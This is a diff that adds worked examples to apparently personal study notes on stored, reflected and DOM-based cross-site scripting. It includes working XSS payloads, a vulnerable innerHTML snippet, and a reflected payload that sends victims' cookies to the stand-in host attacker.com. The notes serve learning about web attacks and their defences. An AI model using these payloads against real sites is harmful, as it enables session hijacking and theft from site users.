@@ -42,7 +42,23 @@ Types of XSS attacks:
 1. Stored (Persistent) XSS: The malicious script is permanently saved on the target server (e.g., in a database, comment section, forum post), 
 affecting users who access the compromised page.
 
-ex: *
+ex: 
+
+Scenario: A vulnerable forum or blog comment section.
+
+Attack Steps:
+
+1. Attacker Action: An attacker visits a blog's comment section and submits a comment containing malicious JavaScript:
+HTML
+
+<script>alert('You have been hacked!');</script>
+
+2. Server Action: The blog application, lacking proper input validation and sanitization, stores this entire comment (including the <script> tags) directly into its database.
+
+3. Victim Action: Any subsequent user who views that blog post will have their browser load the stored comment from the server.
+
+4. Result: When the victim's browser renders the page, it encounters the <script> tag and executes the alert('You have been hacked!'); JavaScript. 
+This could easily be replaced with code to steal cookies, redirect users, or deface the page.
 
 
 1.1 Kind of Reflected XSS payload to be used is based on:
@@ -67,7 +83,30 @@ At this point, the testing methodology is broadly the same as for finding reflec
 requiring the attacker to trick the victim into clicking a specially crafted link. 
 Web server doesn't check the mal input and embeds in the HTTP response that causes the vuln.
 
-ex: *
+ex: 
+
+Scenario: A vulnerable search function on an e-commerce website.
+
+Attack Steps:
+
+1. Vulnerability: The website's search page takes a user's query from the URL and directly embeds it back into the HTML response without proper encoding. 
+For example, if you search for shoes, the URL might be https://example.com/search?query=shoes and the page displays "You searched for: shoes".
+
+2. Attacker Action: An attacker crafts a malicious URL like this:
+
+https://example.com/search?query=<script>document.location='http://attacker.com/steal_cookies?c='+document.cookie;</script>
+
+3. Delivery Mechanism: The attacker sends this malicious URL to a victim, perhaps via an email, chat message, or a link on a compromised website.
+
+4. Victim Action: The victim clicks on the link. Their browser sends a request to example.com with the malicious script in the query parameter.
+
+5. Server Action: The example.com server receives the request. 
+Because it's vulnerable, it takes the <script> tag from the query parameter and reflects it directly into the HTML response:
+
+<h1>You searched for: <script>document.location='http://attacker.com/steal_cookies?c='+document.cookie;</script></h1>
+
+6. Result: When the victim's browser receives this response, it executes the embedded JavaScript. 
+This script redirects the victim to attacker.com while also sending their session cookie (document.cookie), allowing the attacker to potentially hijack their session.
 
 
 2.1 Kind of Reflected XSS payload to be used is based on:
@@ -112,7 +151,36 @@ and see if the injected JavaScript is indeed executed.
 3. DOM-based XSS: The vulnerability lies in the client-side code (JavaScript) that processes data, 
 modifying the Document Object Model (DOM) environment in the victim's browser rather than the server response itself.
 
+ex:
 
+Scenario: A web page that uses JavaScript to display a user-supplied message based on the URL's fragment identifier (the part after #).
+
+Attack Steps:
+
+1. Vulnerability: A legitimate page https://example.com/greeting.html has JavaScript like this:
+
+// greeting.html
+document.addEventListener('DOMContentLoaded', function() {
+    var message = decodeURIComponent(window.location.hash.substring(1)); // Gets content after #
+    document.getElementById('displayArea').innerHTML = 'Hello, ' + message + '!';
+});
+
+And in its HTML: <div id="displayArea"></div> The vulnerability is in using innerHTML with unsanitized user input from window.location.hash.
+
+2. Attacker Action: An attacker crafts a malicious URL:
+
+https://example.com/greeting.html#<img src=x onerror=alert('DOM_XSS_Attack')>
+
+3. Delivery Mechanism: The attacker sends this link to a victim.
+
+4. Victim Action: The victim clicks on the link. 
+Their browser navigates to greeting.html. Crucially, the content after # (<img src=x onerror=alert('DOM_XSS_Attack')>) is not sent to the server.
+
+5. Client-Side Action: Once the page loads in the victim's browser, the JavaScript on greeting.html executes. 
+It retrieves the fragment identifier using window.location.hash, decodes it, and then directly inserts it into the innerHTML of the displayArea div.
+
+6. Result: The browser interprets the injected <img> tag. Since src=x is an invalid image source, the onerror event fires, executing alert('DOM_XSS_Attack'). 
+The attack happens entirely client-side, without the malicious payload ever interacting with the server.
 
 -
 
